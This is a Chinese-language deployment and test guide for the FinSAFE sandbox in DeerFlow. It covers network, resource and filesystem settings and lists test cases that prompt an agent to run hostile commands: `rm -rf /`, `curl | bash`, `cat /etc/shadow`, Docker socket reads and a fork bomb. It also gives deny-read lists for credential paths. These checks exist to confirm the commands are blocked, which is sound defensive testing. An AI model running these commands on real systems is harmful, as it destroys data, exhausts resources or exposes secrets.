# FinSAFE × DeerFlow 安全配置与测试指引

本文档面向**部署与验收人员**：说明当前 DeerFlow 集成中**可配置的安全项**、推荐配置模板，以及**可重复执行的测试用例**（手动 + 自动化）。

策略细节与架构图见 [finsafe-policy.md](finsafe-policy.md)；DeerFlow Compose 接线见上游 `deer-flow/docker/FINSAFE.md`。

---

## 1. 安全能力分层（测什么）

```
用户聊天 / bash 工具
    ↓ ① DeerFlow SandboxAudit（命令审计：block / warn / pass）
    ↓ ② config.yaml sandbox.*（网络、cgroup、超时）
    ↓ ③ FinsafeSandboxProvider 组装的 cell JSON（Landlock 基线 + 资源）
    ↓ ④ finsafe-daemon.yaml（真实 cell、broker 池、宿主机内存预算）
    ↓ ⑤ FinSAFE 编译器内置（deny-read、bwrap 命名空间、uid 1000）
```

| 层级 | 能否通过 YAML 调整 | 本集成是否暴露 |
|------|-------------------|----------------|
| SandboxAudit | 否（代码规则） | 始终启用 |
| `sandbox.network_mode` 等 | 是 | 是 |
| cell `filesystem` + `policy_extensions` | FinSAFE 支持 | **是**（`filesystem_*`、`policy_extensions`） |
| `mock_cells` | daemon YAML | 是 |
| 内置 deny-read | FinSAFE 编译器 | 自动合并；可用 `filesystem_skip_default_deny_read` 关闭 |

### 1.1 工具路径与隔离边界（重要）

| DeerFlow 工具 | 执行方式 | 适用 FinSAFE cell 策略 |
|---------------|----------|------------------------|
| `bash` | finsafe-server **cell**（Landlock + cgroup + network） | 是 |
| `ls` / `glob` / `grep` | cell 内 `find`/`grep` | 是 |
| `read_file` / `write_file` | daemon **session 文件 API**（直接读写 workspace 目录） | **否**（不经 cell） |

因此：**bash 集成测试**能验证 cell 内 deny-read（如 `cat /etc/shadow`），但 Agent 用 **`read_file` 读 workspace 内 `.env`** 的行为取决于 daemon 文件 API，与 cell 策略可能不一致。敏感数据应同时依赖 FinSAFE 内置 deny-read 与 DeerFlow 虚拟路径校验。

`bash_command_timeout` 会传入 cell 的 `resources.timeout_ms`（经 `execute_command` → `_run_shell`）。

---

## 2. 前置条件

### 2.1 启动栈

生产栈（推荐 LAN / 稳定部署）：

```bash
cd /path/to/deer-flow/docker
docker compose -p deer-flow \
  -f docker-compose.yaml \
  -f docker-compose.finsafe.yaml \
  pull finsafe-saas
docker compose -p deer-flow \
  -f docker-compose.yaml \
  -f docker-compose.finsafe.yaml \
  up -d
```

浏览器入口：`http://<主机>:2026`

### 2.2 三处配置必须一致

| 项 | `config.yaml` | `docker/finsafe-daemon.yaml` | `docker-compose.finsafe.yaml` |
|----|---------------|------------------------------|-------------------------------|
| API 令牌 | `sandbox.token` 或 `$FINSAFE_TOKEN` | `auth.bearer_token` | `gateway.environment.FINSAFE_TOKEN` |
| 租户 | `sandbox.tenant_id` | `auth.tenant_id` | — |
| 默认用户 | `sandbox.user_id` | `auth.user_id` | — |
| Sidecar 地址 | `sandbox.base_url` 或 `$FINSAFE_BASE_URL` | — | `FINSAFE_BASE_URL=http://finsafe-saas:8080` |

修改 `config.yaml` 后重启 gateway；修改 daemon YAML 后重启 `finsafe-saas`：

```bash
docker compose -p deer-flow -f docker-compose.yaml -f docker-compose.finsafe.yaml up -d --no-deps gateway
docker compose -p deer-flow -f docker-compose.yaml -f docker-compose.finsafe.yaml up -d --no-deps finsafe-saas
```

### 2.3 就绪探针

在 gateway 容器内应返回 **HTTP 404**（表示服务已启动，执行不存在）：

```bash
docker exec deer-flow-gateway sh -c \
  'curl -s -o /dev/null -w "%{http_code}" \
   -H "Authorization: Bearer dev-change-me" \
   http://finsafe-saas:8080/v1/executions/does-not-exist'
# 期望: 404
```

Sidecar 日志应出现真实 cell（非 mock）：

```bash
docker logs deer-flow-finsafe-saas 2>&1 | grep -E 'mock='
# 期望包含: mock=false
```

---

## 3. 可配置安全项（完整清单）

### 3.1 DeerFlow `config.yaml` → `sandbox:`

在 `config.example.yaml` **Option 5** 有注释模板；启用示例：

```yaml
sandbox:
  use: finsafe_deerflow_adapter:FinsafeSandboxProvider

  # ── 连接与身份 ──
  base_url: $FINSAFE_BASE_URL
  token: $FINSAFE_TOKEN
  tenant_id: acme
  user_id: app-user          # 未登录时的默认 FinSAFE 用户；已登录用户会覆盖

  # ── Cell 安全姿态 ──
  policy_id: deerflow-sandbox
  host_profile: linux-desktop-isolated
  network_mode: deny         # 生产推荐；开发可临时 host（见 §4.2）

  # ── 单 cell cgroup 限制（memparse：用 G/M，勿用 GiB）──
  memory_max: "2G"
  pids_max: "512"
  cpu_max: "200000 100000"   # cgroup v2，约 2 核

  # ── DeerFlow 工具层限制 ──
  bash_command_timeout: 600
  bash_output_max_chars: 20000
  read_file_output_max_chars: 50000
  ls_output_max_chars: 20000

  # ── 仅 allowlist 模式（需自建 egress-proxy，官方镜像不支持）──
  # network_mode: allowlist
  # network_allowlist:
  #   - "api.example.com:443"
```

#### 字段说明

| 字段 | 默认值 | 说明 |
|------|--------|------|
| `network_mode` | `deny` | `deny` 禁止出网；`host` 共享 sidecar 网络（隔离最弱）；`allowlist` 需 egress-proxy |
| `memory_max` | `2G` | 单 cell 内存上限 |
| `pids_max` | `512` | 单 cell 进程数上限 |
| `cpu_max` | `200000 100000` | 单 cell CPU 配额 |
| `bash_command_timeout` | `600` | bash 前台最长秒数，并写入 cell `timeout_ms` |
| `host_profile` | `linux-desktop-isolated` | bwrap + Landlock + cgroup |

环境变量兜底：`FINSAFE_BASE_URL`、`FINSAFE_TOKEN`（Compose 已注入 gateway）。

### 3.2 Sidecar `docker/finsafe-daemon.yaml`

```yaml
executor:
  mock_cells: false            # 必须为 false 才有真实隔离

sessions:
  reaper_interval_secs: 60     # 空闲 session 清理

resident: {}                   # 勿省略；使用默认 broker 池（max_brokers=32）

host_profiles:
  linux-desktop-isolated:
    memory_max: "8G"           # 宿主机级内存预算（所有 cell 合计），≠ 单 cell 的 2G
```

可选（上游支持，当前 DeerFlow 示例未用）：

```yaml
# scheduler:
#   max_concurrent_per_tenant: 64
#   max_requests_per_user_per_window: 200
```

### 3.3 Provider 自动组装的 cell JSON（均可通过 `config.yaml` 配置）

每次 bash / 文件操作，Gateway 向 finsafe-server 提交 **一次 execution**，结构分为 `policy`（高阶策略）与 `request`（身份 + 命令）。DeerFlow 侧由 `FinsafeSandbox._build_execution_payload()` 组装。

#### 3.3.1 完整 HTTP 载荷示例

```json
{
  "policy": {
    "schema_version": 1,
    "policy_id": "deerflow-sandbox",
    "filesystem": {
      "read_only_paths": ["/usr", "/bin", "/sbin", "/lib", "/lib64", "/etc"],
      "read_write_paths": ["/dev/null"]
    },
    "resources": {
      "memory_max": "2G",
      "pids_max": "512",
      "cpu_max": "200000 100000",
      "timeout_ms": 600000
    },
    "network": { "mode": "deny" }
  },
  "request": {
    "schema_version": 1,
    "identity": {
      "tenant_id": "acme",
      "user_id": "<deerflow-user-id>",
      "execution_id": "exec-…",
      "request_id": "req-…",
      "session_id": "sess-…",
      "agent_id": "deerflow"
    },
    "policy_id": "deerflow-sandbox",
    "host_profile": "linux-desktop-isolated",
    "request": {
      "mode": "short-lived",
      "command": ["/bin/sh", "-lc", "…"],
      "work_dir": "/var/lib/finsafe/sessions/sess-…"
    }
  }
}
```

要点：

- **`work_dir`** 必须是 create-session 返回的 **宿主机路径**（如 `/var/lib/finsafe/sessions/sess-…`），**不能**填 guest `/workspace`。否则 session rw bind 会被策略里的 `read_write_paths` 自绑定遮蔽，工作区写入会落到错误目录。
- **`host_profile`** 来自 `config.yaml` 的 `sandbox.host_profile`（默认 `linux-desktop-isolated`）。
- **`timeout_ms`** 仅在带超时的 bash 调用时写入；值为 `bash_command_timeout × 1000`（默认 600000）。

#### 3.3.2 `config.yaml` → `policy` 字段映射

| `policy` 字段 | `config.yaml` 键 | 默认值 |
|---------------|------------------|--------|
| `policy_id` | `policy_id` | `deerflow-sandbox` |
| `network.mode` | `network_mode` | `deny` |
| `network.allowlist` | `network_allowlist` | `[]` |
| `network.proxy_profile` 等 | `network_proxy_profile`、`network_tls_terminate`、… | 见 `config.example.yaml` Option 5 |
| `resources.*` | `memory_max`、`pids_max`、`cpu_max`、`bash_command_timeout` | `2G` / `512` / `200000 100000` / 600s |
| `filesystem.read_only_paths` | `filesystem_read_only_paths` | `/usr`、`/bin`、… |
| `filesystem.read_write_paths` | `filesystem_read_write_paths` | `[/dev/null]` |
| `filesystem.deny_read_paths` | `filesystem_deny_read_paths` | `[]` |
| `filesystem.deny_write_globs` | `filesystem_deny_write_globs` | `[]` |
| `filesystem.skip_default_deny_read` | `filesystem_skip_default_deny_read` | `false` |
| `syscalls` | `syscalls` | 省略 |
| `identity.use_user_namespace` | `identity_use_user_namespace` | 省略 |
| `environment` / `l7_rules` / … | `policy_extensions` | `{}` |
| Session 工作区 rw | （自动） | finsafe-server 按 `work_dir` 注入 |
| 内置 deny-read | （自动） | FinSAFE 编译器，除非 `filesystem_skip_default_deny_read: true` |

**执行请求层**（`request` 段，同样在 `sandbox:` 下配置）：

| 字段 | `config.yaml` 键 | 默认值 |
|------|------------------|--------|
| `identity.agent_id` | `agent_id` | `deerflow` |
| `request.mode` | `execution_mode` | `short-lived` |
| POST `/v1/sessions` mode | `session_mode` | `workspace` |
| HTTP 超时 / 轮询 | `http_timeout_seconds`、`execution_poll_interval_seconds` | `120` / `0.1` |
| bootstrap 目录 | `bootstrap_directories`、`capture_directory` | 见 Option 5 |
| 下载上限 | `download_max_bytes` | `104857600` |

完整字段列表与注释见 **`config.example.yaml` Option 5** 与 **`sandbox_config.py`**。

`network_mode: allowlist` 时 JSON 变为：

```json
"network": {
  "mode": "allowlist",
  "allowlist": ["api.example.com:443", "pypi.org:443"]
}
```

官方 `ghcr.io/geeksfino/finsafe-saas` **无 egress-proxy**，提交 allowlist 通常会 admission 失败（`policy_router_unavailable_capability`）。

#### 3.3.3 为何默认 `filesystem` 这样配置

`linux-desktop-isolated` cell 对宿主机 rootfs 做 `--ro-bind / /`，但 **Landlock 仍限制实际可访问路径**。若 `filesystem` 为空：

| 缺失项 | 现象 |
|--------|------|
| 无 `read_only_paths` | 只能访问设备基线 + 注入的工作区 → `exec /bin/sh` **exit 127** |
| 无 `read_write_paths: [/dev/null]` | shell 重定向 `2>/dev/null` → **EACCES** |

因此默认在 `config.yaml` 声明最小 rootfs 只读集 + `/dev/null` 可写；**可在 `filesystem_read_only_paths` / `filesystem_read_write_paths` 中覆盖或扩展**。session 工作区仍由 server 注入，不要写入 guest `/workspace` 自绑定。

策略组装代码：`finsafe_policy.build_high_level_policy()`（由 Provider 调用）。

#### 3.3.4 编译后实际生效的能力（mental model）

DeerFlow 提交的 `policy` 只是 **高阶意图**；finsafe-server 编译为 `CompiledExecutionPlan` 后再起 cell：

```
DeerFlow policy JSON
    + inject_workspace_bind（session 目录 → rw bind + Landlock rw）
    + host_profile 模板（linux-desktop-isolated：bwrap 命名空间、uid 1000、seccomp 等）
    + sandbox-defaults 内置 deny-read（除非上游 skip_default_deny_read）
    → bubblewrap argv + Landlock 规则 + cgroup v2 scope
```

Agent 在 cell 内看到的路径：

| DeerFlow 虚拟路径 | cell 内相对路径 | 说明 |
|-------------------|-----------------|------|
| `/mnt/user-data/workspace/…` | `mnt/user-data/workspace/…` | 主工作区（bootstrap 创建） |
| `/mnt/user-data/uploads/…` | `mnt/user-data/uploads/…` | 上传 |
| `/mnt/acp-workspace/…` | `mnt/acp-workspace/…` | ACP 工作区 |
| `/mnt/skills/…` | `mnt/skills/…` | Skills |
| `/etc`、`/usr` 等 | 同路径 | 只读（Landlock + ro-bind） |

DeerFlow 还在 **虚拟路径层** 拦截 `..` 穿越（`FinsafeSandbox._guard_traversal`），与 FinSAFE 两层叠加。

#### 3.3.5 高级 FinSAFE 字段（`policy_extensions`）

上游 [HighLevelPolicyV1](https://github.com/finogeeks/finsafe) 中结构较复杂的字段，通过 **`policy_extensions`** 原样合并进每次 cell 的 `policy` JSON，例如：

```yaml
sandbox:
  policy_extensions:
    environment:
      passthrough: ["PATH", "LANG"]
    approval:
      execution_mode: auto
```

常用扩展键：`environment`、`artifacts`、`approval`、`l7_rules`、`credential_map`、`threat_intel_feed`。

#### 3.3.6 如何观察实际提交的策略

**日志（间接）：**

```bash
# 每次 bash 应出现 session execution POST
docker logs deer-flow-gateway 2>&1 | grep -E 'sessions/.*/executions|Created FinSAFE sandbox'

# cell 是否真实、是否 mock
docker logs deer-flow-finsafe-saas 2>&1 | grep -E 'exec-|mock=|succeeded|failed'
```

**单元测试（策略形状，无需 sidecar）：**

```bash
cd finsafe-deerflow-adapter && ./scripts/smoke.sh --quick
```

**改 `network_mode` 后验证 JSON 行为：**

| 配置 | 在 cell 内执行 `curl -sm3 http://nginx:2026 …` |
|------|--------------------------------------------------|
| `deny` | `NETWORK-BLOCKED` |
| `host` | `NETWORK-OPEN` |

见测试用例 **TC-NET-01 / TC-NET-02**（§5.2）。

#### 3.3.7 与 §3.1 的关系小结

```text
config.yaml sandbox.*     →  policy + request 各字段（见 §3.3.2）
finsafe-server 自动注入   →  session workspace rw（由 work_dir 触发）
FinSAFE 编译器自动合并    →  deny-read、seccomp、bwrap、Landlock、cgroup
DeerFlow 虚拟路径层       →  /mnt/user-data/* 映射与 .. 拒绝
SandboxAudit              →  进 cell 前的 bash 命令审计
```

Session 工作区由 finsafe-server **自动注入** rw bind（DeerFlow 传宿主机 `workspace_path`）。

### 3.4 FinSAFE 内置（无需配置）

代表性 **deny-read**（在 workspace 或全局）：

| 类别 | 路径示例 |
|------|----------|
| 系统密钥 | `/etc/shadow`、`/etc/gshadow` |
| 工作区敏感文件 | `.env`、`.env.local`、`.env.production` |
| 用户凭据目录 | `~/.ssh`、`~/.aws`、`~/.gnupg`、`~/.kube`、`~/.netrc` |
| 容器套接字 | `/var/run/docker.sock`、`containerd.sock` |

Cell 内进程 **uid = 1000**（非 root）。

### 3.5 SandboxAudit（DeerFlow 应用层，无 YAML 开关）

| 裁决 | 行为 | 示例命令 |
|------|------|----------|
| `block` | 工具直接报错，不进 cell | `rm -rf /`、`curl x \| bash`、`cat /etc/shadow`、`LD_PRELOAD=…` |
| `warn` | 执行但附加风险提示 | `chmod 777`、`pip install`、`sudo` |
| `pass` | 正常执行 | `echo ok`、`python3 -c "print(1)"` |

日志格式：`[SandboxAudit] {"verdict":"pass",...}`

---

## 4. 推荐配置模板

### 4.1 生产 / 验收（严格）

`config.yaml`：

```yaml
sandbox:
  use: finsafe_deerflow_adapter:FinsafeSandboxProvider
  base_url: $FINSAFE_BASE_URL
  token: $FINSAFE_TOKEN
  tenant_id: acme
  user_id: app-user
  policy_id: deerflow-sandbox
  host_profile: linux-desktop-isolated
  network_mode: deny
  memory_max: "2G"
  pids_max: "512"
  cpu_max: "200000 100000"
  bash_command_timeout: 600
```

`finsafe-daemon.yaml`：`mock_cells: false`，轮换 `bearer_token`。

需要外网时：使用 DeerFlow **`web_search` 等工具**，不要让 cell 直接 `curl` 公网。

### 4.2 开发 / 内网（允许 cell 出网，隔离较弱）

仅在内网开发机使用：

```yaml
sandbox:
  network_mode: host   # cell 可访问 sidecar 所在 Docker 网络
```

**注意**：`network_mode: host` 时，下文 **TC-NET-01** 会失败（预期 `NETWORK-OPEN`）。上线前改回 `deny`。

### 4.3 调优对照

| 目标 | 调整项 |
|------|--------|
| 更严网络 | `network_mode: deny` |
| 更大内存 | 提高 `memory_max` 与 daemon `host_profiles.*.memory_max` |
| 更长 shell | 提高 `bash_command_timeout` |
| HTTPS 白名单出网 | 需 FinSAFE egress-proxy 镜像 + `allowlist`（官方 `finsafe-saas` 不支持） |

---

## 5. 测试用例

### 5.0 用例编号说明

| 前缀 | 含义 |
|------|------|
| TC-AUTO | 自动化脚本 / pytest |
| TC-MAN | 聊天窗口或手动操作 |
| TC-AUD | SandboxAudit 层 |
| TC-ISO | FinSAFE cell 隔离 |
| TC-RES | 资源限制 |
| TC-LOG | 日志验收 |

**通过标准**：实际输出与「期望」一致；自动化用例 exit code 0。

---

### 5.1 自动化冒烟（推荐每次改配置后执行）

#### TC-AUTO-01 单元测试（无需 sidecar）

```bash
cd /path/to/deer-flow
./scripts/smoke.sh --quick
```

期望：`tests/test_provider.py` 与 `tests/test_policy.py` 全部通过。

#### TC-AUTO-02 集成冒烟（Provider → daemon → cell）

```bash
./scripts/smoke.sh
```

覆盖：`tests/test_integration.py` 共 7 项：

| 测试函数 | 验证点 |
|----------|--------|
| `test_daemon_readiness` | HTTP 404 就绪 |
| `test_execute_command_identity` | `echo` + `id -u` → **1000** |
| `test_write_read_append` | workspace 读写 |
| `test_list_glob_grep` | list/glob/grep |
| `test_network_denied` | `network_mode: deny` 时 **NETWORK-BLOCKED** |
| `test_sensitive_read_denied` | `cat /etc/shadow` 被拒 |
| `test_cell_toolbox_python` | `python3` 可运行 |

**若 `network_mode: host`**：`test_network_denied` 会失败——属预期；请用 §5.2 TC-NET-02 代替网络断言。

#### TC-AUTO-03 聊天窗口 E2E（完整 HTTP 路径）

```bash
./scripts/smoke.sh
```

模拟：注册 → 建 thread → SSE stream → Fake LLM 强制一次 bash。

期望（`network_mode: deny`）：

- SSE 工具结果含：唯一 marker、`1000`、`NET-BLOCKED`
- 日志含：`Created FinSAFE sandbox`、`[SandboxAudit] … "verdict": "pass"`
- Sidecar：`mock=false`

在 gateway 内单独跑：

```bash
docker exec deer-flow-gateway sh -c \
  uv run pytest tests/test_integration.py -m integration -v
```

---

### 5.2 手动测试 — 聊天窗口

在 `http://<主机>:2026` 登录后新建对话，让 Agent **使用 bash 工具**执行下列命令（可一次粘贴一条）。

#### TC-MAN-01 沙盒身份

**发送**（自然语言即可，例如）：

> 请用 bash 执行：`echo SANITY-OK && id -u && id -g`

| 检查项 | 期望 |
|--------|------|
| 输出含 `SANITY-OK` | 是 |
| uid | `1000` |
| 工具无 `Error:` 前缀 | 是 |

#### TC-MAN-02 工作区读写

> 请用 bash：`echo hello > /mnt/user-data/workspace/tc-man-02.txt && cat /mnt/user-data/workspace/tc-man-02.txt`

| 检查项 | 期望 |
|--------|------|
| 文件内容 | `hello` |
| 同 thread 再次 read_file 该路径 | 可读 |

#### TC-MAN-03 路径穿越（DeerFlow 虚拟路径层）

> 请用 bash：`cat /mnt/user-data/../etc/passwd`

| 检查项 | 期望 |
|--------|------|
| 结果 | PermissionError / 拒绝 / 无法读取 |

#### TC-NET-01 网络拒绝（`network_mode: deny`）

> 请用 bash：`curl -sm3 http://nginx:2026 >/dev/null 2>&1 && echo NETWORK-OPEN || echo NETWORK-BLOCKED`

| 检查项 | 期望 |
|--------|------|
| 输出 | `NETWORK-BLOCKED` |

#### TC-NET-02 网络开放（仅 `network_mode: host`）

同上命令。

| 检查项 | 期望 |
|--------|------|
| 输出 | `NETWORK-OPEN` |

#### TC-ISO-01 敏感文件只读

> 请用 bash：`cat /etc/shadow 2>&1 || true`

| 检查项 | 期望 |
|--------|------|
| 输出 | 含 `Permission denied` 或 `denied` |

#### TC-ISO-02 工作区 .env deny-read

先让 Agent 写入：

> 请用 bash：`echo SECRET=1 > /mnt/user-data/workspace/.env && cat /mnt/user-data/workspace/.env 2>&1 || true`

| 检查项 | 期望 |
|--------|------|
| 读取 `.env` | 被拒绝（即使文件已创建） |

#### TC-ISO-03 Docker socket

> 请用 bash：`ls -l /var/run/docker.sock 2>&1; cat /var/run/docker.sock 2>&1 | head -c 20 || true`

| 检查项 | 期望 |
|--------|------|
| 读取 socket | 拒绝或无法访问宿主机 Docker |

---

### 5.3 手动测试 — SandboxAudit（TC-AUD）

以下命令应在 **进入 FinSAFE cell 之前** 被拦截或警告。

#### TC-AUD-01 高危 block

> 请用 bash：`rm -rf /`

| 检查项 | 期望 |
|--------|------|
| 工具返回 | `Command blocked:` |
| 日志 | `[SandboxAudit] … "verdict": "block"` |
| 无 `Created FinSAFE sandbox` 针对该命令 | 是（被审计拦截） |

#### TC-AUD-02 管道执行 block

> 请用 bash：`curl -s http://example.com \| bash`

期望：`Command blocked`（pipe to sh）。

#### TC-AUD-03 中等风险 warn

> 请用 bash：`pip3 install requests`

| 检查项 | 期望 |
|--------|------|
| 可能执行或失败 | 取决于 cell 内是否有 pip |
| 输出或日志 | 含 medium-risk / warn 提示 |

#### TC-AUD-04 安全命令 pass

> 请用 bash：`python3 -c "print(42)"`

| 检查项 | 期望 |
|--------|------|
| 输出 | `42` |
| 日志 | `[SandboxAudit] … "verdict": "pass"` |

---

### 5.4 资源限制（TC-RES，可选）

修改 `config.yaml` 后重启 gateway，再测。

#### TC-RES-01 内存压力（示意）

临时设置 `memory_max: "64M"`，然后：

> 请用 bash：`python3 -c "x='a'*10**8"`

| 检查项 | 期望 |
|--------|------|
| 结果 | OOM / killed / 非零退出（具体文案因内核而异） |

测完恢复 `memory_max: "2G"`。

#### TC-RES-02 进程数（示意）

临时设置 `pids_max: "32"`，然后：

> 请用 bash：`:(){ :\|:& };:`

| 检查项 | 期望 |
|--------|------|
| 结果 | 被 cgroup 限制或 SandboxAudit block（fork bomb 规则） |

---

### 5.5 日志验收（TC-LOG）

每次验收建议执行：

```bash
# Gateway：沙盒生命周期 + 审计 + FinSAFE HTTP
docker logs deer-flow-gateway 2>&1 | tail -200 | grep -iE 'FinSAFE|SandboxAudit|finsafe-saas'

# Sidecar：真实 cell
docker logs deer-flow-finsafe-saas 2>&1 | grep -E 'mock=|exec-'
```

成功的一次 bash 调用应看到类似顺序：

1. `[SandboxAudit] … "verdict": "pass"`
2. `Created FinSAFE sandbox … (session=…)`
3. `POST http://finsafe-saas:8080/v1/sessions/…/executions`
4. Sidecar：`exec-…` / `succeeded`，且启动时 `mock=false`

---

## 6. 测试结果矩阵（快速对照）

| 用例 | deny 网络 | host 网络 | 说明 |
|------|-----------|-----------|------|
| TC-AUTO-02 `test_network_denied` | PASS | **FAIL** | host 模式改用 TC-NET-02 |
| TC-AUTO-03 chat E2E | PASS | **FAIL** | 断言 `NET-BLOCKED` |
| TC-MAN-01 uid 1000 | PASS | PASS | |
| TC-NET-01 / TC-NET-02 | BLOCKED | OPEN | 互斥 |
| TC-ISO-01 shadow | PASS | PASS | |
| TC-AUD-01 rm -rf | BLOCKED | BLOCKED | 审计层，与网络无关 |

---

## 7. 常见问题

| 现象 | 可能原因 | 处理 |
|------|----------|------|
| gateway 401 / 403 | token 或 tenant 不一致 | 对齐三处 token；登录用户 tenant 须匹配 |
| bash 返回 127 | Landlock 基线或镜像缺工具 | 确认 `finsafe-saas` 版本 ≥ 集成验证版本；看 sidecar 日志 |
| `mock=true` | `mock_cells: true` | 改 daemon YAML 为 `false` 并重启 |
| `GiB` 相关 cgroup 错误 | 用了 `8GiB` | 改为 `8G` |
| 集成测试网络失败但预期 deny | 配置了 `host` | 改 `deny` 或跳过网络用例 |
| chat E2E 未覆盖 | 聊天全链路测试在 DeerFlow 侧维护 | 使用 `./scripts/smoke.sh` 验证 provider → cell |

---

## 8. 生产上线检查清单

- [ ] `network_mode: deny`
- [ ] `mock_cells: false`，日志 `mock=false`
- [ ] 已轮换 `bearer_token` / `FINSAFE_TOKEN`（非 `dev-change-me`）
- [ ] `memory_max` / `host_profiles.*.memory_max` 使用 `G` 后缀
- [ ] Sidecar：`privileged: true`、`cgroup: host`、`FINSAFE_HELPER_ALLOWED_CGROUP_ROOT` 已设置
- [ ] `./scripts/smoke.sh` 通过
- [ ] `./scripts/smoke.sh` 通过（deny 网络环境）
- [ ] 手动 TC-MAN-01、TC-NET-01、TC-ISO-01、TC-AUD-01 各执行一次

---

## 9. 相关文件索引

| 文件 | 作用 |
|------|------|
| `config.example.yaml` Option 5 | 配置模板 |
| `docker/finsafe-daemon.yaml` | Sidecar daemon |
| `docker/docker-compose.finsafe.yaml` | Compose overlay |
| `scripts/smoke.sh` | 单元 + live 集成冒烟 |
| `tests/test_integration.py` | 7 项 live 集成测试 |
| `docs/finsafe-policy.md` | 策略参考（英文） |
